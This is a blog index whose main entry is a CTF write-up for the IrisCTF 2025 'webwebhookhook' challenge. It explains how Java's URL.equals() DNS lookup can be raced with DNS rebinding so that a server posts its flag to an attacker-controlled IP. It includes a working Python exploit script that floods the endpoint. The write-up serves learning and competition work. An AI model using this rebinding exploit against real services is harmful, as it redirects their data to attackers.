[{"content":"","date":"12 January 2025","externalUrl":null,"permalink":"/","section":"","summary":"","title":"","type":"page"},{"content":"","date":"12 January 2025","externalUrl":null,"permalink":"/posts/irisctf-2025/","section":"Blog","summary":"","title":"","type":"posts"},{"content":"","date":"12 January 2025","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"12 January 2025","externalUrl":null,"permalink":"/tags/dns-rebinding/","section":"Tags","summary":"","title":"DNS Rebinding","type":"tags"},{"content":" TL;DR # The challenge consisted in exploiting a Race Condition by using DNS rebinding to bypass URL.equals() check in Java.\nDescription # I made a service to convert webhooks into webhooks.\nSource code analysis # Upon extracting the challenge attachments, it will present itself as a Kotlin-based Spring Boot application with minimal code support.\nIn fact the only relevant files to us are WebwebhookhookApplication.kt , State.kt and controller/MainController.kt.\nState.kt\n1package tf.irisc.chal.webwebhookhook 2 3import java.net.URI 4import java.net.URL 5 6class StateType( 7 hook: String, 8 var template: String, 9 var response: String 10 ) { 11 var hook: URL = URI.create(hook).toURL() 12} 13 14object State { 15 var arr = ArrayList\u0026lt;StateType\u0026gt;() 16} The StateType class is being defined to store an hook URL, a mutable template string and a mutable response string. Note that in the constructor, the hook declaration is being shadowed by var hook: URL = URI.create(hook).toURL(), meaning that it will accept hook parameter as string but it\u0026rsquo;ll be casted as an URL object immediately.\nThe StateType class is later used as Collection argument for ArrayList stored inside State.arr.\nThe State object is defined as singleton, meaning there is exactly one instance of State in the entire application.\nThis pattern effectively gives the application a simple in-memory database of all registered hooks and their associated templates.\nWebwebhookhookApplication.kt\n1package tf.irisc.chal.webwebhookhook 2 3import org.springframework.boot.autoconfigure.SpringBootApplication 4import org.springframework.boot.runApplication 5 6@SpringBootApplication 7class WebwebhookhookApplication 8 9const val FLAG = \u0026#34;irisctf{test_flag}\u0026#34;; 10 11fun main(args: Array\u0026lt;String\u0026gt;) { 12 State.arr.add(StateType( 13 \u0026#34;http://example.com/admin\u0026#34;, 14 \u0026#34;{\\\u0026#34;data\\\u0026#34;: _DATA_, \\\u0026#34;flag\\\u0026#34;: \\\u0026#34;\u0026#34; + FLAG + \u0026#34;\\\u0026#34;}\u0026#34;, 15 \u0026#34;{\\\u0026#34;response\\\u0026#34;: \\\u0026#34;ok\\\u0026#34;}\u0026#34;)) 16 runApplication\u0026lt;WebwebhookhookApplication\u0026gt;(*args) 17} This is the main entry point for the Application. Here an entry is being added in the global State object, using:\nhttp://example.com/admin as value for the hook parameter. {\u0026quot;data\u0026quot;: _DATA_, \u0026quot;flag\u0026quot;: \u0026quot;irisctf{test_flag}\u0026quot;} as value for the template string. {\u0026quot;response\u0026quot;: \u0026quot;ok\u0026quot;} as value for the response string. Let\u0026rsquo;s analyze the application further to understand how we might be able to read that flag.\ncontroller/MainController.kt\n1package tf.irisc.chal.webwebhookhook.controller 2 3import org.springframework.http.MediaType 4import org.springframework.stereotype.Controller 5import org.springframework.ui.Model 6import org.springframework.web.bind.annotation.* 7import tf.irisc.chal.webwebhookhook.State 8import tf.irisc.chal.webwebhookhook.StateType 9import java.net.HttpURLConnection 10import java.net.URI 11 12@Controller 13class MainController { 14 15 @GetMapping(\u0026#34;/\u0026#34;) 16 fun home(model: Model): String { 17 return \u0026#34;home.html\u0026#34; 18 } 19 20 @PostMapping(\u0026#34;/webhook\u0026#34;) 21 @ResponseBody 22 fun webhook(@RequestParam(\u0026#34;hook\u0026#34;) hook_str: String, @RequestBody body: String, @RequestHeader(\u0026#34;Content-Type\u0026#34;) contentType: String, model: Model): String { 23 var hook = URI.create(hook_str).toURL(); 24 for (h in State.arr) { 25 if(h.hook == hook) { 26 var newBody = h.template.replace(\u0026#34;_DATA_\u0026#34;, body); 27 var conn = hook.openConnection() as? HttpURLConnection; 28 if(conn === null) break; 29 conn.requestMethod = \u0026#34;POST\u0026#34;; 30 conn.doOutput = true; 31 conn.setFixedLengthStreamingMode(newBody.length); 32 conn.setRequestProperty(\u0026#34;Content-Type\u0026#34;, contentType); 33 conn.connect() 34 conn.outputStream.use { os -\u0026gt; 35 os.write(newBody.toByteArray()) 36 } 37 38 return h.response 39 } 40 } 41 return \u0026#34;{\\\u0026#34;result\\\u0026#34;: \\\u0026#34;fail\\\u0026#34;}\u0026#34; 42 } 43 44 @PostMapping(\u0026#34;/create\u0026#34;, consumes = [MediaType.APPLICATION_JSON_VALUE]) 45 @ResponseBody 46 fun create(@RequestBody body: StateType): String { 47 for(h in State.arr) { 48 if(body.hook == h.hook) 49 return \u0026#34;{\\\u0026#34;result\\\u0026#34;: \\\u0026#34;fail\\\u0026#34;}\u0026#34; 50 } 51 State.arr.add(body) 52 return \u0026#34;{\\\u0026#34;result\\\u0026#34;: \\\u0026#34;ok\\\u0026#34;}\u0026#34; 53 } 54} The router for the Spring Boot Application is configured to have the /create and the /webhook endpoints.\nThe /create endpoint accepts POST requests with application/json body that will be casted as StateType. Then it checks if an entry with same hook is already occurring in the global State object, and if so, it will return a json response of {\u0026quot;result\u0026quot;: \u0026quot;fail\u0026quot;}. After iterating the ArrayList, if no matching instances were found, a new StateType entry will be appended.\nEssentially, this endpoint registers a new webhook configuration, unless it already exists. The /webhook endpoint will accept POST requests with a hook parameter. It will iterate over the State.arr global list of previously created webhook configurations, and if it finds a matching hook URL, it will replace the _DATA_ placeholder in the template with the content of the supplied body, and send a POST request to the given hook URL using HttpURLConnection with the new body. If the hook URL is not found in the State.arr, it will return a json response of {\u0026quot;result\u0026quot;: \u0026quot;fail\u0026quot;}. Note that both the endpoints do not provide SSRF protections, however it\u0026rsquo;s irrelevant for us as there are no additional services running on the server.\nIdentifying the vulnerability # At first glance, there doesn\u0026rsquo;t seem to be an obvious way to intercept the flag, since the only way would be to successfully match the check hook and send the POST to example.org, which would be ez game if we were the admins of domain, which is not the case :P\nOne of my first steps was to try an HTTP smuggling, given the arbitrary control over the body that then replaces the content of _DATA_, to build a request like this:\nSmuggling/Desync attempt on body content. However, we note how the body of the request is correctly set based on the length of our payload at L31 with conn.setFixedLengthStreamingMode(newBody.length) consequently failing to delimit the stream of the request to build a new one. Furthermore, it is not possible to override the request headers and in any case it would be a matter of exploiting a Spring Boot HTTP desync but today will not be the day of 0-days :/\nFinally, in a scenario of arbitrary write in the system we could have tried to overwrite /etc/hosts file to override the DNS resolution of example.org and make it point to an IP under our control, but again, this is not the case for the challenge.\nDoomscrolling remembrance of a random tweet to win # At that point I was pretty lost, the code was really minimal and I had to somehow pull off a complete domain check bypass from a bunch of URL comparisons\u0026hellip;\nWait did I say \u0026ldquo;domain check bypass\u0026rdquo; and \u0026ldquo;url comparison\u0026rdquo; !?\nThat\u0026rsquo;s exactly what I said to myself while overthinking the challenge and I had the remembrance of a (quite strange) Java behavior that I barely read about in a random tweet months ago while doomscrolling on X, which pointed out how comparing two URL objects in Java triggers a DNS resolution üíÄ\nYour brain on Java is when comparing two strings REQUIRES A DNS LOOKUP pic.twitter.com/VYzNBFri5b\n\u0026mdash; Dmitrii Kovanikov (@ChShersh) September 8, 2024 More of that is discussed at the end of the writeup.\nAt this point this enlightenment gave me a clear path to the resolution using DNS rebinding:\nsubmit to /endpoint a domain like rbndr.us that resolves to the IP of example.com. URL.equals() will trigger a DNS resolution on rbndr.us that will make succeed the check against example.com. make the rbndr.us domain resolve to different IP under our control. the POST request will be sent to the IP under our control, with the template body containing the flag. Yep. That\u0026rsquo;s it. Simple as that right?\nü•≤\nNo. ü•≤\nWell, kinda, in theory (and in practice) that would work, I confirmed that the DNS resolution was made on the provided domain and by using a DNS rebinding service like rbndr.us I was able to get different response status codes from the server (because different domains were resolved each time).\nThis behavior was caused by the under the hood work of rbndr, which as explained on their repo, all it does is simply provide a domain that resolves to A with a very low TTL, and then immediately switch the DNS resolution to B so that when a new DNS query is made to the same domain the second time it\u0026rsquo;ll point a different IP address.\nAll of that is the basics of how a DNS rebinding attack works, which you can read more about here.\nThe main hurdle however was not to make DNS rebinding work, but to leverage DNS rebinding to cause a Race when 1) the domain DNS resolves to example.org IP to make the URL.equals() succeed, and 2) the server opens a connection against my domain (causing a new DNS resolution) to send the request with the flag.\nUnfortunately for my sanity, as we can see from the code between L23 and L25, trying to exploit such a window meant finding a precision of a matter of milliseconds.\n23if(h.hook == hook) { 24 var newBody = h.template.replace(\u0026#34;_DATA_\u0026#34;, body); 25 var conn = hook.openConnection() as? HttpURLConnection; Below I have illustrated the attack workflow.\nsequenceDiagram title DNS Rebinding attack flow on Java `URL.equals()` participant Attacker as Attacker participant ChallengeServer as Challenge Server participant AttackerServer as Attacker Rebinder Service (xxxx.rbndr.us) participant DNS as Attacker DNS Server Attacker-\u003e\u003eChallengeServer: POST /endpoint ?hook=xxxx.rbndr.us note over DNS: DNS A Record is 93.184.215.14, TTL=1 (example.org IP) note over DNS: DNS A Record is 83.130.170.16, TTL=1 (attacker IP) note over DNS: DNS A Record is 93.184.215.14, TTL=1 (example.org IP) note over DNS: DNS A Record is 83.130.170.16, TTL=1 (attacker IP) note over DNS: ... note over ChallengeServer: 1) the server code uses URL.equals() to compare ‚Äúxxxx.rbndr.us‚Äù vs ‚Äúexample.org‚Äù ChallengeServer-\u003e\u003eDNS: DNS Query A for xxxx.rbndr.us note over DNS: 2) DNS A Record is 93.184.215.14, TTL=1 (example.org IP) DNS--\u003e\u003eChallengeServer: DNS A response (TTL=1) for xxxx.rbndr.us: 93.184.215.14 note over ChallengeServer: 3) URL.equals() returns true because IP matches example.org note over DNS: DNS A Record is 83.130.170.16, TTL=1 (attacker IP) note over ChallengeServer: 4) hook.openConnection() where hook=xxxx.rbndr.us ChallengeServer-\u003e\u003eDNS: DNS Query A for xxxx.rbndr.us note over DNS: 5) DNS A Record is 83.130.170.16, TTL=1 (attacker IP) DNS ‚Äúrebinding‚Äù event, xxxx.rbndr.us is resolving to Attacker's IP DNS--\u003e\u003eChallengeServer: DNS A response (TTL=1) for xxxx.rbndr.us: 83.130.170.16 note over ChallengeServer: 5) Opens HTTP connection to 83.130.170.16 note over DNS: DNS A Record is 93.184.215.14, TTL=1 (example.org IP) note over DNS: ... ChallengeServer-\u003e\u003eAttacker: POST to 83.130.170.16 {\"flag\":\"irisctf{...}\"} Attacker--\u003e\u003eAttacker: Captures the flag (win) A trick I used to increase my chances of hitting the exact window between Step 1 and Step 4 was to send a large payload in the body to be processed, so that L34 would have a slightly longer execution time to give us the possibility of hitting the DNS resolution change in a larger window.\nNOTE: An interesting research would be to understand how String.replace() is performed internally by Java/Kotlin, since there could be the possibility of using some classic ReDoS tricks to increase the execution time of h.template.replace(\u0026quot;_DATA_\u0026quot;, body) even more. Exploitation (cry and pray) # Having gathered all the elements to exploit, I proceeded to write the following python script:\nexploit.py\n#!/usr/bin/python3 import requests import time import threading from concurrent.futures import ThreadPoolExecutor, as_completed RBNDR = \u0026#34;http://5db8d70e.5e82aa10.rbndr.us\u0026#34; CHALL_URL = \u0026#34;https://webwebhookhook-43435a7246999280.i.chal.irisc.tf\u0026#34; BATCH_SIZE = 20 DELAY_BETWEEN_BATCHES = 0.1 req_id = 0 req_id_lock = threading.Lock() def send_request(session, url, payload): global req_id try: response = session.post(url, headers={\u0026#34;Content-Type\u0026#34;:\u0026#34;application/x-www-form-urlencoded\u0026#34;}, data=payload, timeout=10) with req_id_lock: req_id += 1 current_id = req_id print(f\u0026#34;{current_id} {response.text} {response.status_code}\u0026#34;) except Exception as e: with req_id_lock: req_id += 1 current_id = req_id print(f\u0026#34;{current_id} Error: {e}\u0026#34;) def main(): url = f\u0026#34;{CHALL_URL}/webhook?hook={RBNDR}/admin\u0026#34; payload = \u0026#34;A\u0026#34;*1000 with requests.Session() as session: with ThreadPoolExecutor(max_workers=BATCH_SIZE) as executor: while True: futures = [ executor.submit(send_request, session, url, payload) for _ in range(BATCH_SIZE) ] for future in as_completed(futures): pass time.sleep(DELAY_BETWEEN_BATCHES) if __name__ == \u0026#34;__main__\u0026#34;: main() A little bit of explanation for it:\nThe RBNDR url was constructed with a rebinder service using the example.com IP as the first IP and my VPS IP as the second IP. I opted for a requests batched approach to have an high density of requests in a short time window. Large body payload to increase the execution time of h.template.replace(\u0026quot;_DATA_\u0026quot;, body) and thus increasing the duration of the target window. Spamming the /webhook with a while true loop to have different DNS cache TTLs and increase the chances of an IP switch in the DNS server during the target window. Extra # [\u0026hellip;]\nFlag: irisctf{url_equals_rebind}\n","date":"12 January 2025","externalUrl":null,"permalink":"/posts/irisctf-2025/webwebhookhook/","section":"Blog","summary":"Writeup for webwebhookhook web challenge of IrisCTF 2025","title":"IrisCTF 2025 - webwebhookhook","type":"posts"},{"content":"","date":"12 January 2025","externalUrl":null,"permalink":"/tags/race-condition/","section":"Tags","summary":"","title":"Race Condition","type":"tags"},{"content":"","date":"12 January 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"12 January 2025","externalUrl":null,"permalink":"/categories/web/","section":"Categories","summary":"","title":"Web","type":"categories"},{"content":"","date":"12 January 2025","externalUrl":null,"permalink":"/tags/writeup/","section":"Tags","summary":"","title":"Writeup","type":"tags"},{"content":"","date":"10 January 2025","externalUrl":null,"permalink":"/tags/blogpost/","section":"Tags","summary":"","title":"Blogpost","type":"tags"},{"content":"Welcome to my personal blog!\n","date":"10 January 2025","externalUrl":null,"permalink":"/posts/first_post/","section":"Blog","summary":"","title":"First blog post","type":"posts"},{"content":"Welcome to my personal blog!\n","date":"10 January 2024","externalUrl":null,"permalink":"/posts/","section":"Blog","summary":"","title":"Blog","type":"posts"},{"content":"","externalUrl":null,"permalink":"/about/","section":"","summary":"","title":"","type":"page"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/events/","section":"Events","summary":"","title":"Events","type":"events"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]